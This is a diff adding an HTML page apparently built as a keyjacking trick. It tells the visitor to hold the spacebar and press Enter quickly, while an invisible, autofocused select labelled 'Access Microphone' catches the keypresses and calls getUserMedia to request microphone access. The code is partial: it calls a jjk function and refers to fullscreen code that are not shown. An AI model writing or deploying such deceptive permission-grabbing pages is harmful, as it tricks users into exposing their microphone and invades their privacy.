@@ -1,0 +1,31 @@
+<html>
+<head></head>
+<body id="xx" onload="jjk()">
+  <div style="
+    position: absolute;    margin-top: 20px;"><label><span style="
+       width: 100px;    margin-left: 50px;">HOLD SPACEBAR AND FASTLY PRESS ENTER</span></label></div>
+<div style="margin-left:80px;margin-top: 20px;z-index: 1;position: absolute;">  <span id="xz" style="
+    width: 100px;"></span>  <select onclick="getAudio()" ondblclick="getAudio()" onkeypress="getAudio()" autofocus="" id="sf" style="width:200px;opacity: 0;">    <option value="0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Access Microphone</option></select></div>
+
+
+
+<script>
+var x = document.getElementById("demo");  
+function getAudio() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function(stream) {
+      // Use the stream to play audio or record
+      const audioContext = new AudioContext();
+      const audioSource = audioContext.createMediaStreamSource(stream);
+      // ... process the audio stream as needed
+    })
+    .catch(function(err) {
+      console.error('Error accessing microphone:', err);
+    });
+}
+
+// ... rest of the code (jjk, fullscreen, etc.) remains the same
+</script>
+
+</body>
+</html>
